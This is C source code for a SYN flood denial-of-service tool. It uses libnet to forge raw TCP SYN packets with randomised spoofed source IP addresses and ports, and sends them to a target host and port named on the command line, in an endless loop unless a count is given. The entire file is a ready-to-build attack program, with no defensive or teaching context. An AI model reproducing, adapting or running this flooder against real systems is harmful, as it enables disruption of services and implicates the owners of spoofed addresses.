

#include "synflood.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#define TOTAL_VAL_COUNT 254
int byteval_array[TOTAL_VAL_COUNT] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
   11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
   21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
   31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
   41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
   51, 52, 53, 54, 55, 56, 57, 58, 59, 60,
   61, 62, 63, 64, 65, 66, 67, 68, 69, 70,
   71, 72, 73, 74, 75, 76, 77, 78, 79, 80,
   81, 82, 83, 84, 85, 86, 87, 88, 89, 90,
   91, 92, 93, 94, 95, 96, 97, 98, 99, 100,
   101, 102, 103, 104, 105, 106, 107, 108, 109, 110,
   111, 112, 113, 114, 115, 116, 117, 118, 119, 120,
   121, 122, 123, 124, 125, 126, 127, 128, 129, 130,
   131, 132, 133, 134, 135, 136, 137, 138, 139, 140,
   141, 142, 143, 144, 145, 146, 147, 148, 149, 150,
   151, 152, 153, 154, 155, 156, 157, 158, 159, 160,
   161, 162, 163, 164, 165, 166, 167, 168, 169, 170,
   171, 172, 173, 174, 175, 176, 177, 178, 179, 180,
   181, 182, 183, 184, 185, 186, 187, 188, 189, 190,
   191, 192, 193, 194, 195, 196, 197, 198, 199, 200,
   201, 202, 203, 204, 205, 206, 207, 208, 209, 210,
   211, 212, 213, 214, 215, 216, 217, 218, 219, 220,
   221, 222, 223, 224, 225, 226, 227, 228, 229, 230,
   231, 232, 233, 234, 235, 236, 237, 238, 239, 240,
   241, 242, 243, 244, 245, 246, 247, 248, 249, 250,
   251, 252, 253, 254
};


unsigned char denominator = TOTAL_VAL_COUNT+1;

unsigned char generate_byte_val();  
unsigned char generate_byte_val() { 
    unsigned char inx, random_val;

    if (denominator == 1)
            denominator =  TOTAL_VAL_COUNT+1;
    inx = rand() % denominator; 
    random_val = byteval_array[inx];
    byteval_array[inx] = byteval_array[--denominator];
    byteval_array[denominator] = random_val;
    return random_val;
}

int main(int argc, char **argv){
	
	unsigned int connections = 0;
	unsigned int connectionsc;
	int sockWriteBytes;
	char *errbuf = NULL;
	char *srcIpStr = NULL;
	char *dstIpStr = NULL;
	u_int32_t srcIp = 0;
	u_int32_t dstIp = 0;
	u_int16_t srcPort = 0;
	u_int16_t dstPort = 0;
	libnet_t *net = NULL;
	libnet_ptag_t ipv4 = 0, tcp = 0;
	
	// printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME,
	// 	PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH,
	// 	__DATE__, __TIME__);
	// printf("%s\n", PROJECT_COPYRIGHT);
	// puts("");
	
	if(argc < ARGC_MIN)
		usagePrint();
	
	if(getuid()){
		fprintf(stderr, "ERROR: You are not root, script kiddie.\n");
		exit(1);
	}
	
	srcIpStr = argv[1];
	dstIpStr = argv[2];
	dstPort = atoi(argv[3]);
	if(argc == 5)
		connections = atoi(argv[4]);
	
	errbuf = (char *)malloc(LIBNET_ERRBUF_SIZE);
	
	srcIp = libnet_name2addr4(net, srcIpStr, LIBNET_RESOLVE);
	if(srcIp == -1){
		fprintf(stderr, "ERROR: bad SRC ip address: %s\n", srcIpStr);
		exit(1);
	}
	
	dstIp = libnet_name2addr4(net, dstIpStr, LIBNET_RESOLVE);
	if(dstIp == -1){
		fprintf(stderr, "ERROR: bad DST ip address: %s\n", dstIpStr);
		exit(1);
	}
	
	
	net = libnet_init(LIBNET_RAW4, srcIpStr, errbuf);
	if(!net){
		fprintf(stderr, "ERROR: libnet_init: %s", libnet_geterror(net));
		exit(1);
	}
	libnet_seed_prand(net);
	
	printf("SRC %s\n", srcIpStr);
	printf("DST %s %d\n", dstIpStr, dstPort);
	//printf("TTL %d\n", TTL);
	puts("\nAttack started and sending syn pkts...");
	
	// connectionsc < connections
	for(connectionsc = 0; connectionsc < connections || !connections; connectionsc++){



		
	    struct in_addr ip;
	      
	        ip.s_addr = (generate_byte_val() |
                    (generate_byte_val() << 8) |
                    (generate_byte_val() << 16) |
                    (generate_byte_val() << 24));
            //printf ("IP = %s\n", inet_ntoa(ip));
	        *srcIpStr = inet_ntoa(ip);
	        srcIp = libnet_name2addr4(net, inet_ntoa(ip), LIBNET_RESOLVE);
			/*net = libnet_init(LIBNET_RAW4, srcIpStr, errbuf);
			if(!net){
				fprintf(stderr, "ERROR: libnet_init: %s", libnet_geterror(net));
				exit(1);
			}
			libnet_seed_prand(net);*/








		
#ifdef SRC_PORT_RND
		srcPort = libnet_get_prand(LIBNET_PRu16);
#else
		srcPort++;
		if(srcPort > 65535)
			srcPort = 1;
#endif
		
#ifdef DEBUG
		printf("send %6d SPT=%d\n", connectionsc, srcPort);
#endif
		
		tcp = libnet_build_tcp(
			srcPort, // src port
			dstPort, // dst port
			libnet_get_prand(LIBNET_PRu16), // seq
			0, // ack
			TH_SYN, // control
			65535, // window
			0, // checksum
			0, // urgent
			LIBNET_TCP_H, // header len
			NULL, // payload
			0, // payload size
			net,
			tcp
		);
		if(tcp == -1)
			fprintf(stderr, "ERROR: libnet_build_tcp: %s", libnet_geterror(net));
		
		ipv4 = libnet_build_ipv4(
			LIBNET_IPV4_H, // len
			0, // tos
			libnet_get_prand(LIBNET_PRu16), // ip id
			IP_DF, // frag
			TTL, // ttl
			IPPROTO_TCP, // upper layer protocol
			0, // checksum
			srcIp, // src ip
			dstIp, // dst ip
			NULL, // payload
			0, // payload size
			net,
			ipv4
		);
		if(ipv4 == -1)
			fprintf(stderr, "ERROR: libnet_build_ipv4: %s", libnet_geterror(net));
		
		sockWriteBytes = libnet_write(net);
		if(sockWriteBytes == -1){
			fprintf(stderr, "ERROR: libnet_write: %s", libnet_geterror(net));
#ifdef EXIT_ON_FAIL
			exit(1);
#endif
		}
		
		//libnet_destroy(net);
		usleep(USLEEP);
		
	}
	
	free(errbuf);
	
	puts("\nexit 0");
	return EXIT_SUCCESS;
}

void usagePrint(){
	printf("Usage: ./synflood SRC DST DPT [CONNECTIONS]\n");
	exit(1);
}
